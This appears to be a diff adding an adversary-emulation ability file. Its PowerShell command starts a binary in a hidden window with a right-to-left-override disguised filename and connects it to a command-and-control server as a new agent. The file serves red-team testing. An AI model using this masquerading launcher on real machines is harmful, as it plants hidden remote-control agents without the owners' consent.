@@ -1,0 +1,26 @@
+---
+- id: 571845f6-b75c-4b9d-a666-a78f7827261f
+  name: 1.A - RTLO Start Sandcat (T1036)
+  description: Perform RTLO technique with SANDCAT
+  tactic: execution
+  technique:
+    attack_id: T1036
+    name: RTLO Override
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Sleep 3;
+          $bin = Get-ChildItem *cod*scr*;
+          $arguments = '-server "#{server}" -group "rtlo_group"';
+          start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+          if ($?) {
+            write-host "Successfully completed RTLO execution. A new agent should appear";
+            exit 0;
+
+          } else {
+            write-host "Failure of RTLO execution.";
+            exit 1;
+          }
+        payload: ‮cod.3aka.scr.exe
